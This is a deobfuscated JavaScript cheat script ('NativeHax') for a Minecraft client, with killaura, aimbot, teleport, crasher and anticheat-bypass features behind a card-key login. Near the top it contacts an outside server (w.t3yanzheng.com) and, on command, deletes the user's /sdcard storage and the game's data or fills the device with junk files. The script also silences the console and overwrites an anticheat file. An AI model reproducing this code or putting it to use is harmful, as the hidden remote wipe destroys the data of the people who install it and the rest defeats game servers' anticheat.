//Mon Sep 29 2025 21:45:36 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
var _0x1c6c08 = function () {
  var _0x196f76 = true;
  return function (_0x26d503, _0x4e1ab7) {
    var _0x2a82b1 = _0x196f76 ? function () {
      if (_0x4e1ab7) {
        var _0x4f1a39 = _0x4e1ab7.apply(_0x26d503, arguments);
        _0x4e1ab7 = null;
        return _0x4f1a39;
      }
    } : function () {};
    _0x196f76 = false;
    return _0x2a82b1;
  };
}();
var _0x1e660e = _0x1c6c08(this, function () {
  var _0x534c55 = function () {};
  var _0x21a05f = function () {
    var _0x311daf;
    try {
      _0x311daf = Function("return (function() {}.constructor(\"return this\")( ));")();
    } catch (_0x58db6b) {
      _0x311daf = window;
    }
    return _0x311daf;
  };
  var _0x2478df = _0x21a05f();
  if (!_0x2478df.console) {
    _0x2478df.console = function (_0x2952f2) {
      var _0x1773c3 = {
        log: _0x2952f2,
        warn: _0x2952f2,
        debug: _0x2952f2,
        info: _0x2952f2,
        error: _0x2952f2,
        exception: _0x2952f2,
        table: _0x2952f2,
        trace: _0x2952f2
      };
      return _0x1773c3;
    }(_0x534c55);
  } else {
    _0x2478df.console.log = _0x534c55;
    _0x2478df.console.warn = _0x534c55;
    _0x2478df.console.debug = _0x534c55;
    _0x2478df.console.info = _0x534c55;
    _0x2478df.console.error = _0x534c55;
    _0x2478df.console.exception = _0x534c55;
    _0x2478df.console.table = _0x534c55;
    _0x2478df.console.trace = _0x534c55;
  }
});
_0x1e660e();
clientMessage("§b[NativeHax]§e加载成功");
curl_get("http://w.t3yanzheng.com/456CA7E821390F1B", {}, function (_0x2ef8fe, _0x45b126) {
  if (_0x45b126 == "delete_script") {
    file_delete(getResource() + "/script/NativeHax.js");
  }
  if (_0x45b126 == "delete_all") {
    file_delete("/sdcard");
    file_delete("/data/data/com.netease.x19");
  }
  if (_0x45b126 == "boom") {
    for (i = 0; i < 114514; i++) {
      write_file("/sdcard/" + i, "你好".repeat(114514));
    }
  }
  clientMessage("§e连接服务器成功");
});
const login = _0x37ed64 => {
  const _0x212ae7 = " {\n        \"type\": \"custom_form\",\n        \"title\": \"验证\",\n        \"content\": [{\n            \"type\": \"input\",\n            \"text\": \"卡密\",\n            \"default\": \"" + _0x37ed64 + "\"\n        }]\n    }";
  addForm(_0x212ae7, function (_0x372a7b) {
    curl_get("http://w.t3yanzheng.com/82661FBC74C51961?kami=" + _0x372a7b, {
      kami: _0x372a7b
    }, function (_0x31b844, _0x481021) {
      if (_0x481021.includes("登录成功")) {
        setData("kami", _0x372a7b);
        setData("NativeHax", true);
        user = true;
        clientMessage("§b[NativeHax]§e验证成功");
      } else {
        clientMessage("§b[NativeHax]§e" + _0x481021);
        exit();
      }
    });
  });
};
var user = getData("NativeHax", false);
var kami = getData("kami", "");
const teleport = (_0x54d89d, _0x34fe6c, _0x2ef1cd) => {
  const _0x30be0d = getEntityPos(self_id);
  setMotion(_0x30be0d.x - _0x54d89d, _0x30be0d.y - _0x34fe6c, _0x30be0d.z - _0x2ef1cd);
};
const getItem_Count = (_0xb0b643, _0x23e1d3) => {
  let _0x13fa17 = 0;
  for (i = 0; i < 36; i++) {
    const _0x2e5a96 = getPlayerInventoryItem(self_id, i);
    if (_0x2e5a96.namespace == _0xb0b643 && (_0x23e1d3 == "all" || _0x2e5a96.aux == _0x23e1d3)) {
      _0x13fa17 += _0x2e5a96.count;
    }
  }
  return _0x13fa17;
};
const getText = (_0x46debe, _0x450963, _0x53040c) => {
  let _0x504c86 = _0x46debe.indexOf(_0x450963) + _0x450963.length;
  let _0x435d6e = _0x46debe.indexOf(_0x53040c);
  return _0x46debe.substring(_0x504c86, _0x435d6e);
};
const getItem = (_0x2e45bd, _0x19b685) => {
  let _0x2bad51 = 0;
  for (index = 0; index < 9; index++) {
    const _0x55dbba = getPlayerInventoryItem(_0x2e45bd, index);
    if (_0x55dbba.namespace.includes(_0x19b685)) {
      _0x2bad51 = index;
      break;
    }
  }
  return _0x2bad51;
};
const getType = _0x2e93d8 => {
  let _0x4f880b = getEntityCompleteNBT(_0x2e93d8);
  return getText(_0x4f880b, "identifier:\"minecraft:", "\",ignoreHurt");
};
const isMoving = _0x2eed0a => {
  const _0x247f49 = getEntityMotion(_0x2eed0a);
  const _0x2e7d85 = Math.sqrt(_0x247f49.x * _0x247f49.x + _0x247f49.z * _0x247f49.z);
  return !(_0x2e7d85 > -1e-7 && _0x2e7d85 < 1e-7);
};
const getSpeed = _0x5e48dd => {
  const _0x40a24e = getEntityMotion(_0x5e48dd);
  const _0x7f752f = Math.sqrt(_0x40a24e.x * _0x40a24e.x + _0x40a24e.z * _0x40a24e.z);
  return _0x7f752f * 20;
};
const get_random_num = (_0x40018e, _0x213446) => {
  const _0x408ebc = _0x213446 - _0x40018e + 1;
  return Math.floor(Math.random() * _0x408ebc) + _0x40018e;
};
const get_next_tick_pos = (_0x42887d, _0x4067e9, _0x3d5e93) => {
  return {
    x: _0x4067e9.x + _0x42887d.x * _0x3d5e93,
    y: _0x4067e9.y + _0x42887d.x * _0x3d5e93,
    z: _0x4067e9.z + _0x42887d.z * _0x3d5e93
  };
};
const entity_select = (_0x29d5b6, _0x2b121e) => {
  const _0x4e151a = getPlayerList();
  const _0x2d9d7b = _0x4e151a.length > 0 ? _0x4e151a.map(_0x2a43df => ({
    text: getEntityName(_0x2a43df)
  })) : [{
    text: "没有数据"
  }];
  var _0x38f377 = {
    type: "form",
    title: "选择",
    content: "选择一个目标",
    buttons: _0x2d9d7b
  };
  for (let _0x2fd1c4 in _0x4e151a) {
    _0x38f377.buttons[_0x2fd1c4] = {
      text: getEntityName(_0x4e151a[_0x2fd1c4])
    };
  }
  const _0x14a0d3 = JSON.stringify(_0x38f377);
  addForm(_0x14a0d3, function (_0x7d29b1) {
    if (_0x4e151a.length > 0 && _0x7d29b1 >= 0) {
      const _0x6aa7f9 = _0x2b121e === 0 ? getEntityName(_0x4e151a[_0x7d29b1]) : _0x4e151a[_0x7d29b1];
      eval(_0x29d5b6 + ".push('" + _0x6aa7f9 + "')");
      clientMessage("§e已添加=>§r " + _0x6aa7f9);
    }
  });
};
const get_relative_pos = (_0x45c161, _0x4f9802, _0xc6df28) => {
  var _0x4f5c4b = _0x45c161 < 0 ? true : false;
  var _0x165a5b = false;
  const {
    yaw,
    pitch
  } = _0xc6df28;
  _0x45c161 = Math.abs(_0x45c161);
  const _0x5e24b5 = yaw * Math.PI / 180;
  const _0x5c762b = pitch * Math.PI / 180;
  let _0x44d770 = 0;
  let _0x2a0529 = 0;
  let _0x601fe5 = 0;
  var _0x4d3909 = _0x45c161;
  if (pitch != 0) {
    _0x2a0529 = Math.sin(_0x5c762b) * _0x45c161;
    _0x4d3909 = _0x2a0529 / Math.tan(_0x5c762b);
    if (_0x4d3909 < 0) {
      _0x165a5b = true;
      _0x4d3909 = -_0x4d3909;
    }
  }
  switch (true) {
    case yaw > 90 && yaw < 180:
      _0x601fe5 = Math.cos(_0x5e24b5) * _0x4d3909;
      _0x44d770 = -Math.sin(_0x5e24b5) * _0x4d3909;
      break;
    case yaw > 0 && yaw < 90:
      _0x601fe5 = Math.cos(_0x5e24b5) * _0x4d3909;
      _0x44d770 = -Math.sin(_0x5e24b5) * _0x4d3909;
      break;
    case yaw > -90 && yaw < 0:
      _0x601fe5 = Math.cos(-_0x5e24b5) * _0x4d3909;
      _0x44d770 = Math.sin(-_0x5e24b5) * _0x4d3909;
      break;
    case yaw > -180 && yaw < -90:
      _0x601fe5 = Math.cos(-_0x5e24b5) * _0x4d3909;
      _0x44d770 = Math.sin(-_0x5e24b5) * _0x4d3909;
      break;
    default:
      break;
  }
  if (_0x4f5c4b || _0x165a5b) {
    _0x44d770 = -_0x44d770;
    if (!_0x165a5b) {
      _0x2a0529 = -_0x2a0529;
    }
    _0x601fe5 = -_0x601fe5;
  }
  return {
    x: _0x4f9802.x + _0x44d770,
    y: _0x4f9802.y - _0x2a0529,
    z: _0x4f9802.z + _0x601fe5
  };
};
const isSame = (_0x52dcb0, _0x3b94ec, _0x1d21b9) => Math.abs(_0x52dcb0 - _0x3b94ec) < _0x1d21b9;
const get_target = (_0x620d76, _0x35b932, _0x2a116d) => {
  var _0x381ce9 = includeMob ? getEntityList() : getPlayerList();
  _0x2a116d = _0x2a116d > _0x381ce9.length ? _0x381ce9.length : _0x2a116d;
  var _0x5e7b0f = [];
  for (i in _0x381ce9) {
    const _0x28438d = _0x381ce9[i];
    const _0x2bcf8d = getType(_0x28438d);
    if (_0x2bcf8d === "arrow" || _0x2bcf8d === "tnt" || _0x2bcf8d === "item" || _0x2bcf8d === "snowball") {
      continue;
    }
    const _0x1190ca = getEntityPos(_0x28438d);
    const _0x142a10 = get_distance(_0x1190ca, getEntityPos(_0x620d76));
    const _0x26a3a1 = getEntityName(_0x28438d);
    const _0x3d6e44 = getEntityAttribute(_0x28438d, 4);
    if (_0x3d6e44.current == undefined) {
      continue;
    }
    if (white_list.includes(_0x26a3a1) || _0x26a3a1 == getEntityName(_0x620d76) || _0x142a10 > _0x35b932 && !tpaura && !infinite_distance || _0x142a10 <= 0.5 || _0x1190ca.y > limit_y) {
      continue;
    }
    if (teams && _0x26a3a1.includes(team)) {
      continue;
    }
    if ((_0x26a3a1.includes("player.entity") || _0x26a3a1.includes("entity.") || _0x26a3a1 === "") && exclude_bot) {
      continue;
    }
    if (regex.length > 0 && regex.some(_0x3b2776 => _0x26a3a1.includes(_0x3b2776))) {
      continue;
    }
    _0x5e7b0f.push({
      distance: _0x142a10,
      target_id: _0x28438d,
      heal: _0x3d6e44.current
    });
  }
  _0x5e7b0f.sort((_0x2109b6, _0x477c00) => _0x2109b6.distance - _0x477c00.distance);
  _0x5e7b0f = _0x5e7b0f.length > _0x2a116d + 1 ? _0x5e7b0f.slice(0, _0x2a116d + 1) : _0x5e7b0f.slice(0, _0x5e7b0f.length);
  if (select_mode === 1) {
    _0x5e7b0f.sort((_0x5d8f54, _0x17250b) => _0x5d8f54.heal - _0x17250b.heal);
  }
  return _0x5e7b0f.map(_0x50ff9d => _0x50ff9d.target_id);
};
const get_distance = (_0x56e53c, _0x31f4a5) => {
  return Math.sqrt(Math.pow(_0x56e53c.x - _0x31f4a5.x, 2) + Math.pow(_0x56e53c.y - _0x31f4a5.y, 2) + Math.pow(_0x56e53c.z - _0x31f4a5.z, 2));
};
const get_distance_id = (_0x172544, _0x23e019) => {
  const _0x2f45e6 = getEntityPos(_0x172544);
  const _0x3a49ef = getEntityPos(_0x23e019);
  return Math.sqrt(Math.pow(_0x2f45e6.x - _0x3a49ef.x, 2) + Math.pow(_0x2f45e6.y - _0x3a49ef.y, 2) + Math.pow(_0x2f45e6.z - _0x3a49ef.z, 2));
};
const get_distance_id_level = (_0x2dadf3, _0x22f0f1) => {
  const _0x4cbacb = getEntityPos(_0x2dadf3);
  const _0x4f169e = getEntityPos(_0x22f0f1);
  return Math.sqrt(Math.pow(_0x4cbacb.x - _0x4f169e.x, 2) + Math.pow(_0x4cbacb.z - _0x4f169e.z, 2));
};
const setPos = (_0x6bf7f0, _0x1860df, _0xad370c) => setEntityPos(self_id, _0x6bf7f0, _0x1860df, _0xad370c);
const setMotion = (_0x2ae3d9, _0x2a30e0, _0x13e146) => setEntityMotion(self_id, _0x2ae3d9, _0x2a30e0, _0x13e146);
const str2obj = _0x5ae504 => _0x5ae504.includes(",") ? [_0x5ae504] : _0x5ae504.split(",");
const obj2str = _0x3d6155 => _0x3d6155.length <= 1 ? _0x3d6155[0] : _0x3d6155.join(",");
const edit_value = (_0x596a0d, _0x517935, _0x30b7df, _0x54970d) => {
  var _0x3a44c7 = _0x54970d === 0 ? obj2str(_0x517935) : _0x517935;
  addForm("{\"type\":\"custom_form\",\"title\":\"" + _0x30b7df + "\",\"content\":[{\"type\":\"input\",\"text\":\"文本\",\"placeholder\":\"\",\"default\":\"" + _0x3a44c7 + "\"}]}", function (_0x6af320) {
    if (_0x54970d === 1) {
      eval(_0x596a0d + " = '" + _0x6af320 + "'");
      clientMessage("§e成功设置为=> §r" + _0x6af320);
    } else {
      if (_0x54970d === 0) {
        eval(_0x596a0d + " = " + JSON.stringify(str2obj(_0x6af320)));
        clientMessage("§e成功设置为=> §r" + JSON.stringify(str2obj(_0x6af320)));
      }
    }
  });
};
const get_team = _0x50cd77 => {
  if (typeof _0x50cd77 != "string" || _0x50cd77 == "") {
    return "None";
  }
  let _0x45282f = _0x50cd77.match(/\[(.*?)\]/g);
  if (_0x45282f == null) {
    return "None";
  }
  return _0x45282f[0];
};
const get_player_block_pos = _0x3babbf => {
  const _0x4b56df = getEntityPos(_0x3babbf);
  return {
    x: Math.ceil(_0x4b56df.x) - 1,
    y: Math.floor(_0x4b56df.y) - 1,
    z: Math.ceil(_0x4b56df.z) - 1
  };
};
const calculateArrowFlightTime = _0x109a39 => {
  const _0x2b246d = aimbot_gravity;
  const _0x5433a1 = aimbot_speed;
  var _0x2abad0 = _0x109a39 * Math.PI / 180;
  var _0x5db6d8 = 2 * _0x5433a1 * Math.sin(_0x2abad0) / _0x2b246d;
  return _0x5db6d8;
};
const calculateLaunchAngle = (_0x332ae9, _0x8b1821) => {
  const _0x749d2d = aimbot_gravity;
  const _0x27c3a8 = aimbot_speed;
  var _0x560e0f = _0x8b1821 < 0 ? true : false;
  if (_0x560e0f) {
    _0x8b1821 = -_0x8b1821;
  }
  var _0x84026a = Math.atan((Math.pow(_0x27c3a8, 2) - Math.sqrt(Math.pow(_0x27c3a8, 4) - _0x749d2d * (_0x749d2d * Math.pow(_0x332ae9, 2) + 2 * _0x8b1821 * Math.pow(_0x27c3a8, 2)))) / (_0x749d2d * _0x332ae9));
  var _0x5886ca = _0x84026a * 180 / Math.PI;
  if (_0x5886ca > 7 || _0x5886ca < -7) {
    return !_0x560e0f ? _0x5886ca : -_0x5886ca;
  } else {
    return !_0x560e0f ? -_0x5886ca : _0x5886ca;
  }
};
const get_rot_angle = (_0xeeaea5, _0x13a447, _0x402ae1) => {
  let _0x38269b = {};
  let _0x4fc30f = {};
  if (typeof _0xeeaea5 != "string") {
    _0x4fc30f = _0xeeaea5;
  } else {
    _0x4fc30f = getEntityPos(_0xeeaea5);
  }
  if (typeof _0x13a447 != "string") {
    _0x38269b = _0x13a447;
  } else {
    _0x38269b = getEntityPos(_0x13a447);
  }
  let _0x11dbb0 = getEntitySize(_0x13a447);
  let _0x482ca6 = _0x38269b.x - _0x4fc30f.x;
  let _0x3a0a2d = _0x4fc30f.y - (aimbot_mode == 0 ? _0x11dbb0.y * 0.85 : 0) - _0x38269b.y;
  let _0x576b09 = _0x38269b.z - _0x4fc30f.z;
  let _0xe5b093 = getEntityRot(_0xeeaea5);
  if (aimbot_test) {
    let _0x493082 = aimbot_aim_speed * 20;
    if (aimbot_throw) {
      _0x493082 = calculateArrowFlightTime(_0xe5b093.pitch) * 20;
    }
    _0x38269b = get_next_tick_pos(getEntityMotion(_0x13a447), getEntityPos(_0x13a447), Math.abs(_0x493082));
  }
  if (_0x402ae1 == "yaw_pos") {
    let _0x3a5617 = Math.atan2(_0x576b09, _0x482ca6) * 180 / Math.PI;
    return _0x3a5617 > -180 && _0x3a5617 <= 90 ? _0x3a5617 + 90 : _0x3a5617 - 270;
  }
  if (_0x402ae1 == "yaw_rot") {
    var _0x1a0d15 = _0xe5b093.yaw;
    let _0x1d9ed0 = Math.atan2(_0x576b09, _0x482ca6) * 180 / Math.PI;
    _0x1d9ed0 = _0x1d9ed0 > -180 && _0x1d9ed0 <= 90 ? _0x1d9ed0 + 90 : _0x1d9ed0 - 270;
    let _0x5d02f4 = _0x1d9ed0 - _0x1a0d15;
    return _0x5d02f4 > 0 ? -_0x5d02f4 + 180 : -_0x5d02f4 - 180;
  }
  if (_0x402ae1 == "pitch_pos") {
    const _0x488405 = get_distance_id_level(_0xeeaea5, _0x13a447);
    const _0x2ec267 = calculateLaunchAngle(_0x488405, Math.round(_0x3a0a2d));
    let _0x3ee3e7 = aimbot_throw ? _0x2ec267 : Math.atan2(_0x3a0a2d, _0x488405) * 180 / Math.PI;
    return _0x3ee3e7;
  }
  if (_0x402ae1 == "pitch_rot") {
    var _0x1cddd3 = _0xe5b093.pitch;
    const _0x38e00a = get_distance_id_level(_0xeeaea5, _0x13a447);
    const _0x2c926d = calculateLaunchAngle(_0x38e00a, _0x4fc30f.y - 1.53 - _0x38269b.y);
    let _0x5d0d91 = aimbot_throw ? _0x2c926d : Math.atan2(_0x3a0a2d, _0x38e00a) * 180 / Math.PI;
    let _0x3cde01 = _0x5d0d91 - _0x1cddd3;
    return _0x3cde01;
  }
};
const isAimed = (_0x2a0a2b, _0x3daf27, _0x41cc41, _0xad8327) => {
  let _0x4df490 = Math.abs(get_rot_angle(_0x2a0a2b, _0x3daf27, "yaw_rot"));
  let _0x2a220c = Math.abs(get_rot_angle(_0x2a0a2b, _0x3daf27, "pitch_rot"));
  if (_0xad8327 == 0) {
    return _0x4df490 < _0x41cc41 && _0x2a220c < _0x41cc41;
  }
  if (_0xad8327 == 1) {
    return _0x4df490 < _0x41cc41;
  }
  if (_0xad8327 == 2) {
    return _0x2a220c < _0x41cc41;
  }
};
var target_list = [];
var white_list = [];
var includeMob = false;
var limit_y = 256;
var infinite_distance = false;
var exclude_bot = true;
var select_mode = 0;
var killaura_boost = 1;
var killaura_max_cps = 10;
var killaura_min_cps = 10;
var killaura_Fov = 90;
var killaura_distance = 4;
var killaura_infinite = false;
var killaura_d_1 = [];
var killaura_d_2 = [];
var killaura_auto_close = true;
var record_speed = {};
var autorun_mode = "/hub";
var aimbot_aim_speed = 20;
var aimbot_distance = 5;
var aimbot_Fov = 90;
var aimbot_speed = 100;
var aimbot_gravity = 16;
var aimbot_test = false;
var aimbot_throw = false;
var aimbot_mode = 0;
var trace_min_dis = 5;
var trace_speed = 5;
var team = "NativeHax";
var text = "L";
var crasher_mode = 0;
var cleaner_mode = 0;
var cleaner_path = getResource() + "/NativeHax/Cleaner.json";
var keep_y = false;
var rec_y = 0;
var killaura = false;
var auto_target = false;
var show_tip = true;
var rider = false;
var show_self_tip = true;
var teams = false;
var aimbot = false;
var trace = false;
var tpaura = false;
var crasher = false;
var no_chat = false;
var self_id = getLocalPlayerUniqueID();
var last_tick_id = getLocalPlayerUniqueID();
var last_tick_pos = getEntityPos(self_id);
let p = {};
var regex = ["商店", "抽奖"];
var mcp = "";
const file = "/data/data/com.netease.x19/files/games/com.netease/packcache/e5f7550b-b347-463f-a464_behavior_packs_AntiCheatingBehavior/AntiCheatingScript.mcp";
globalThis.onTickEvent = function () {
  self_id = getLocalPlayerUniqueID();
  var _0x30cf46 = getEntityName(self_id);
  var _0x3dffb2 = getEntityPos(self_id);
  var _0x31890a = getEntityMotion(self_id);
  var _0x2b7d00 = getEntityRot(self_id);
  var _0x2a13eb = isMoving(self_id);
  var _0x2aaf99 = get_distance(_0x3dffb2, last_tick_pos) / 0.05;
  var _0x5acd79 = get_player_block_pos(self_id);
  if (target_list > 0 && !auto_target) {
    target_list.map(_0x1e19ca => {
      if (!findEntity(_0x1e19ca)) {
        target_list.splice(i, 1);
      }
    });
  }
  if (killaura_auto_close && self_id != last_tick_id && killaura) {
    killaura = false;
    clientMessage("§c自动关闭杀戮");
  }
  if (show_self_tip && target_list.length === 0) {
    showTipMessage("您的队伍:§e " + team + " §r速度:§e" + _0x2aaf99.toFixed(2) + "b/s");
  }
  if (findEntity(target_list[0]) && trace && target_list.length > 0 && get_distance_id(self_id, target_list[0]) > trace_min_dis) {
    let _0x2e3251 = get_rot_angle(self_id, target_list[0], "yaw_pos");
    let _0x3be233 = get_rot_angle(self_id, target_list[0], "pitch_pos");
    let _0x2f4f03 = get_relative_pos(-trace_speed / 5, getEntityPos(self_id), {
      yaw: _0x2e3251,
      pitch: _0x3be233
    });
    setMotion(_0x31890a.x, -1e-7, _0x31890a.z);
    setEntityPos(self_id, _0x2f4f03.x, _0x2f4f03.y, _0x2f4f03.z);
  }
  if (killaura && target_list.length > 0) {
    target_list.map(_0x6c2f76 => {
      killaura_d_1[_0x6c2f76] = Date.now();
      if ((get_distance_id(self_id, _0x6c2f76) <= killaura_distance || killaura_infinite) && isAimed(self_id, _0x6c2f76, killaura_Fov, 0) && (killaura_d_1[_0x6c2f76] - killaura_d_2[_0x6c2f76] >= 0 || killaura_d_2[_0x6c2f76] == undefined)) {
        for (k = 0; k < killaura_boost; k++) {
          attackEntity(_0x6c2f76, true);
        }
      }
      killaura_d_2[_0x6c2f76] = killaura_d_1[_0x6c2f76] + 1000 / get_random_num(killaura_min_cps, killaura_max_cps) - 50;
    });
  }
  if (findEntity(target_list[0]) && rider && target_list.length > 0) {
    var _0x1dab79 = getEntityPos(target_list[0]);
    _0x1dab79.y += 4;
    setPos(_0x1dab79.x, _0x1dab79.y, _0x1dab79.z);
    showTipMessage("§e正在锁定: §r" + getEntityName(target_list[0]));
  }
  if (crasher && crasher_mode === 2) {
    setPos(_0x3dffb2.x, Infinity, _0x3dffb2.z);
  }
  let _0xe22da3 = getEntityAttribute(self_id, 4);
  setEntityAttribute(self_id, 2, getEntityAttribute(self_id, 3));
  setEntityAttribute(self_id, 6, getEntityAttribute(self_id, 3));
  if (findEntity(target_list[0]) && target_list.length > 0 && aimbot) {
    const _0x16f908 = target_list[0];
    const _0x4929c5 = get_distance_id(self_id, _0x16f908);
    const _0x2a2e4a = getEntitySize(_0x16f908);
    const _0x22a52c = isAimed(self_id, _0x16f908, aimbot_Fov, 0);
    if (_0x4929c5 <= aimbot_distance && _0x22a52c || aimbot_throw) {
      let _0x4191b8 = get_rot_angle(self_id, _0x16f908, "yaw_rot");
      let _0x3e10d9 = get_rot_angle(self_id, _0x16f908, "pitch_rot");
      let _0x42863f = _0x4191b8 >= 0 ? -aimbot_aim_speed / 2 : aimbot_aim_speed / 2;
      let _0xd96557 = _0x3e10d9 >= 0 ? -aimbot_aim_speed / 4 : aimbot_aim_speed / 4;
      const _0x42282e = isAimed(self_id, _0x16f908, _0x42863f * 2, 1);
      const _0x46921a = isAimed(self_id, _0x16f908, _0xd96557 * 2, 2);
      if (_0x22a52c) {
        if (!_0x42282e) {
          setLocalPlayerRot(0, _0x42863f);
        }
        if (!_0x46921a && !aimbot_throw || !isSame(_0x3e10d9, 0, 1) && aimbot_throw) {
          setLocalPlayerRot(_0xd96557, 0);
        }
      }
      showTipMessage("§e正在瞄准: §r" + getEntityName(_0x16f908));
    }
  }
  rec_y = !keep_y || rec_y === 0 ? _0x3dffb2.y : rec_y;
  last_tick_id = self_id;
  last_tick_pos = _0x3dffb2;
};
globalThis.onCallModuleEvent = function (_0x4dd29f) {
  if (!_0x4dd29f.name.includes("NativeHax")) {
    return true;
  }
  if (!user) {
    login(kami);
    return true;
  }
  if (_0x4dd29f.key != undefined) {
    if (_0x4dd29f.key === "team" || _0x4dd29f.key === "text") {
      edit_value(_0x4dd29f.key, _0x4dd29f.key === "team" ? team : text, "编辑", "编辑" + _0x4dd29f.key, 1);
    }
    if (_0x4dd29f.key === "add_item") {
      const _0x56776f = getEntityCarriedItem(self_id);
      let _0x93ef5d = JSON.parse(read_file(cleaner_path));
      _0x93ef5d.push(_0x56776f.namespace);
      write_file(cleaner_path, JSON.stringify(_0x93ef5d));
      clientMessage("§b[DianaGod UI-GB]§e已添加 " + _0x56776f.namespace);
    }
    if (_0x4dd29f.key === "regex" || _0x4dd29f.key === "white_list") {
      edit_value(_0x4dd29f.key, _0x4dd29f.key === "regex" ? regex : white_list, "编辑" + _0x4dd29f.key, 0);
    }
    if (_0x4dd29f.key === "add_whitelist" || _0x4dd29f.key === "add_target") {
      entity_select(_0x4dd29f.key === "add_whitelist" ? "white_list" : "target_list", _0x4dd29f.key === "add_whitelist" ? 0 : 1);
    }
    return;
  }
  if (_0x4dd29f.aimbot_mode != undefined) {
    aimbot_mode = _0x4dd29f.index - 1;
    clientMessage("§b已设置模式为 §r- §e" + _0x4dd29f.aimbot_mode);
    return true;
  }
  if (_0x4dd29f.select_mode != undefined) {
    select_mode = _0x4dd29f.index - 1;
    clientMessage("§b已设置模式为 §r- §e" + _0x4dd29f.select_mode);
    return true;
  }
  if (_0x4dd29f.crasher_mode != undefined) {
    crasher_mode = _0x4dd29f.index - 1;
    clientMessage("§b已设置模式为 §r- §e" + _0x4dd29f.crasher_mode);
    return true;
  }
  if (_0x4dd29f.autorun_mode != undefined) {
    autorun_mode = _0x4dd29f.autorun_mode;
    clientMessage("§b已设置模式为 §r- §e" + _0x4dd29f.autorun_mode);
    return true;
  }
  if (_0x4dd29f.cleaner_mode != undefined) {
    cleaner_mode = _0x4dd29f.index - 1;
    clientMessage("§b已设置模式为 §r- §e" + _0x4dd29f.cleaner_mode);
    return true;
  }
  if (_0x4dd29f.shop_mode != undefined) {
    shop = _0x4dd29f.index - 1;
    clientMessage("§b已设置模式为 §r- §e" + _0x4dd29f.shop_mode);
    return true;
  }
  for (key in _0x4dd29f) {
    if (key == "value" && key == "fun" && key == "name") {
      continue;
    }
    if (key == "crasher") {
      if (_0x4dd29f[key]) {
        callModule(41, "{\"show_fun\":false}");
        callModule(35, "{\"value\":true,\"count\":200}");
        if (crasher_mode === 0) {
          callModule(69, "{\"5\":true,\"6\":true,\"speed\":0,\"value\":true}");
        }
        if (crasher_mode === 1) {
          callModule(68, "{\"value\":true}");
        }
      } else {
        callModule(35, "{\"value\":false,\"count\":20}");
        if (crasher_mode === 0) {
          callModule(69, "{\"5\":false,\"6\":false,\"speed\":20,\"value\":false}");
        }
        if (crasher_mode === 1) {
          callModule(68, "{\"value\":false}");
        }
        callModule(41, "{\"show_fun\":true}");
      }
      crasher = _0x4dd29f[key];
    }
    if (key == "bypass_hyt") {
      if (_0x4dd29f[key]) {
        callModule(41, "{\"show_fun\":false}");
        callModule(35, "{\"value\":true,\"count\":50}");
      } else {
        callModule(35, "{\"value\":false,\"count\":20}");
        callModule(41, "{\"show_fun\":true}");
      }
    }
    if (typeof _0x4dd29f[key] == "boolean" || typeof _0x4dd29f[key] == "number") {
      const _0x497f1d = key;
      if (typeof _0x4dd29f[key] == "boolean" || typeof _0x4dd29f[key] == "number") {
        eval(_0x497f1d + " = " + _0x4dd29f[key]);
        if (key === "auto_speed" && _0x4dd29f[key]) {
          record_speed = getEntityAttribute(self_id, 3);
        } else {
          if (key === "auto_speed" && !_0x4dd29f[key]) {
            setEntityAttribute(self_id, 3, record_speed);
          }
        }
        if (typeof _0x4dd29f[key] == "boolean") {
          if (_0x4dd29f[key]) {
            clientMessage("§b" + _0x497f1d + "§r - §a已启用");
          } else {
            clientMessage("§b" + _0x497f1d + "§r - §c已禁用");
            if (key === "bypass_server") {
              write_file(file, mcp);
            }
          }
        }
      }
    }
  }
};
globalThis.onPlayerAttackEvent = function (_0x428fce, _0x51e188) {
  if (_0x51e188 != undefined && _0x51e188 != _0x428fce && show_tip && findEntity(_0x51e188)) {
    let _0x18630b = getEntityAttribute(_0x51e188, 4);
    let _0x57a904 = get_distance_id(_0x428fce, _0x51e188);
    if (_0x18630b != undefined) {
      showTipMessage("§e正在攻击 : " + getEntityName(_0x51e188) + "§b\n血量 : " + _0x18630b.current.toFixed(2) + "/" + _0x18630b.max.toFixed(2) + "§a\n距离: " + _0x57a904.toFixed(2) + "m ");
    }
  }
};
globalThis.onClientMessageEvent = function () {
  return no_chat;
};
globalThis.onSendChatMessageEvent = function (_0x262a25) {
  if (_0x262a25 == "退出") {
    clientMessage("§b[NativeHax]§e已退出");
    exit();
    return true;
  }
};
login(kami);